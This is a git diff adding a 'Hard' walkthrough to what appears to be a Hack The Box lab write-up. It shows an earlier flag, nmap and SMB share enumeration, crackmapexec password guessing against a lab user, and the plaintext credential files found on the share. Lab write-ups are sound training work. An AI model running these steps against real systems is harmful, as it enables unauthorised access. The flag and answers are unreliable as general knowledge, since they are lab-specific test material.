@@ -304,6 +304,7 @@ simon
 **Flag**
 
 With the credentials found, log into the FTP server on port 2121
+
 ```
 ftp 10.129.201.127 2121
 
@@ -336,3 +337,239 @@ ftp> exit
 HTB{1qay2wsx3EDC4rfv_M3D1UM}
 
 ```
+
+
+
+## Hard
+
+**IP**
+```
+10.129.64.154
+```
+
+**Domain**
+```
+inlanefreight.htb
+```
+
+**NMAP**
+```
+nmap -Pn -sC -p- -sV 10.129.203.10
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-10 19:12 EST
+Nmap scan report for inlanefreight.htb (10.129.203.10)
+Host is up (0.028s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.203.10:1433: 
+|     Target_Name: WIN-HARD
+|     NetBIOS_Domain_Name: WIN-HARD
+|     NetBIOS_Computer_Name: WIN-HARD
+|     DNS_Domain_Name: WIN-HARD
+|     DNS_Computer_Name: WIN-HARD
+|_    Product_Version: 10.0.17763
+|_ssl-date: 2024-01-11T00:17:26+00:00; 0s from scanner time.
+| ms-sql-info: 
+|   10.129.203.10:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-01-11T00:10:43
+|_Not valid after:  2054-01-11T00:10:43
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WIN-HARD
+|   NetBIOS_Domain_Name: WIN-HARD
+|   NetBIOS_Computer_Name: WIN-HARD
+|   DNS_Domain_Name: WIN-HARD
+|   DNS_Computer_Name: WIN-HARD
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-01-11T00:16:46+00:00
+| ssl-cert: Subject: commonName=WIN-HARD
+| Not valid before: 2024-01-10T00:10:33
+|_Not valid after:  2024-07-11T00:10:33
+|_ssl-date: 2024-01-11T00:17:26+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-01-11T00:16:48
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 269.21 seconds
+```
+
+
+**SMB**
+
+- SMB is running, let's see what shares are available
+
+```
+ smbmap -H 10.129.64.154                                                   
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 0 SMB session(s)                                
+                                                                                                                                                                        
+┌──(dan㉿ZeroSigma)-[~/subbrute]
+└─$ smbclient -N -L //10.129.64.154      
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        Home            Disk      
+        IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.64.154 failed (Error NT_STATUS_IO_TIMEOUT)
+Unable to connect with SMB1 -- no workgroup available
+
+```
+
+**Crack Simon's passcode with the provided list**
+```
+crackmapexec smb 10.129.64.154 -u simon -p pws.list --local-auth
+SMB         10.129.64.154   445    WIN-HARD         [*] Windows 10.0 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
+SMB         10.129.64.154   445    WIN-HARD         ==[+] WIN-HARD\simon:liverpool==
+```
+
+password
+```
+liverpool
+```
+
+**SMB Share Login**
+```
+ smbclient -U simon //10.129.64.154/Home                                   
+Password for [WORKGROUP\simon]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Apr 21 17:18:21 2022
+  ..                                  D        0  Thu Apr 21 17:18:21 2022
+  HR                                  D        0  Thu Apr 21 16:04:39 2022
+  IT                                  D        0  Thu Apr 21 16:11:44 2022
+  OPS                                 D        0  Thu Apr 21 16:05:10 2022
+  Projects                            D        0  Thu Apr 21 16:04:48 2022
+
+                7706623 blocks of size 4096. 3167198 blocks available
+smb: \> 
+
+```
+
+In the IT directory, three folders with two additional potential usernames: fiona and john
+```
+smb: \IT\> dir
+  .                                   D        0  Thu Apr 21 16:11:44 2022
+  ..                                  D        0  Thu Apr 21 16:11:44 2022
+  Fiona                               D        0  Thu Apr 21 16:11:53 2022
+  John                                D        0  Thu Apr 21 17:15:09 2022
+  Simon                               D        0  Thu Apr 21 17:16:07 2022
+
+                7706623 blocks of size 4096. 3167182 blocks available
+smb: \IT\> 
+```
+
+Fiona's Folder
+```
+smb: \IT\Fiona\> dir
+  .                                   D        0  Thu Apr 21 16:11:53 2022
+  ..                                  D        0  Thu Apr 21 16:11:53 2022
+  creds.txt                           A      118  Thu Apr 21 16:13:11 2022
+
+                7706623 blocks of size 4096. 3167182 blocks available
+smb: \IT\Fiona\> 
+
+```
+
+Fiona's Creds:
+```
+└─$ cat creds.txt 
+Windows Creds
+
+kAkd03SA@#!
+48Ns72!bns74@S84NNNSl
+SecurePassword!
+Password123!
+SecureLocationforPasswordsd123!!
+```
+
+John's Folder:
+```
+smb: \IT\John\> dir
+  .                                   D        0  Thu Apr 21 17:15:09 2022
+  ..                                  D        0  Thu Apr 21 17:15:09 2022
+  information.txt                     A      101  Thu Apr 21 17:14:58 2022
+  notes.txt                           A      164  Thu Apr 21 17:13:40 2022
+  secrets.txt                         A       99  Thu Apr 21 17:15:55 2022
+
+                7706623 blocks of size 4096. 3167182 blocks available
+smb: \IT\John\> 
+
+```
+
+Content of John's files:
+```
+cat information.txt 
+To do:
+- Keep testing with the database.
+- Create a local linked server.
+- Simulate Impersonation.                                                                                                                                                                        
+cat notes.txt      
+Hack The Box is a massive, online cybersecurity training platform, allowing individuals, companies, universities and all kinds of organizations around the world ...                                                                                                                                                                        
+cat secrets.txt 
+Password Lists:
+
+1234567
+(DK02ka-dsaldS
+Inlanefreight2022
+Inlanefreight2022!
+TestingDB123
+
+```
+
+Simon's Folder
+```
+smb: \IT\Simon\> dir
+  .                                   D        0  Thu Apr 21 17:16:07 2022
+  ..                                  D        0  Thu Apr 21 17:16:07 2022
+  random.txt                          A       94  Thu Apr 21 17:16:48 2022
+
+                7706623 blocks of size 4096. 3167182 blocks available
+
+```
+
+Content of Simon's file:
+```
+└─$ cat random.txt 
+Credentials
+
+(k20ASD10934kadA
+KDIlalsa9020$
+JT9ads02lasSA@
+Kaksd032klasdA#
+LKads9kasd0-@  
+```
+
